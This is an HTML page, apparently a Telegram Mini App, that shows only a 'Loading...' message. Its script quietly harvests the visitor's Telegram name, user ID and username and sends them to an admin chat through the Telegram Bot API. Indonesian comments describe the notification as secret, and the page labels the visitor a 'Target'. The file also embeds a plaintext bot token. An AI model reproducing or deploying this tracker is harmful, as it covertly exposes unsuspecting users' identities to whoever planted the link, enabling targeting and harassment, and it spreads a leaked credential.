<!DOCTYPE html>

</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <h3>Loading...</h3>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const user = tg.initDataUnsafe.user;
        const startParam = tg.initDataUnsafe.start_param;

        if (user && startParam) {
            const adminId = startParam.split('_')[1];
            const botToken = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
            
            // Kirim notif tracking ke Admin secara diam-diam
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: adminId,
                    text: `👤 **Target Klik Link!**\nNama: ${user.first_name}\nID: ${user.id}\nUser: @${user.username || '-'}`,
                    parse_mode: 'Markdown'
                })
            });
        }
    </script>
</body>
</html>
